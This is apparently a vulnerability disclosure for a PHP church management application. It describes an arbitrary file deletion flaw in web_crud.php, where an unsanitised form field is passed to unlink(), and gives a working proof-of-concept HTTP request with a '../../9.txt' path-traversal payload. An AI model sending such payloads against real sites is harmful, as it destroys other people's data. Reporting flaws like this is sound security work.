### Vulnerability file address

In line 273 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photo2_img']);`,` $_POST['old_photo2_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['photo2']['tmp_name'] != '') {
            $img2 = generateUniqueFilename($_FILES['photo2']);
            $filepath = "../../assets/images/" . $img2;

            if (move_uploaded_file($_FILES["photo2"]["tmp_name"], $filepath)) {
                @unlink("../../assets/images/" . $_POST['old_photo2_img']);
            }
        } 
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 373

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update5"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo2_img"

../../9.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo2";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `9.txt` file in the `church/` directory

![image-20250504212205312](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042122354.png)

Then we execute the above poc to attack

![image-20250504212250301](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042122328.png)

Files are deleted after the attack is successful

![image-20250504212241617](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042122647.png)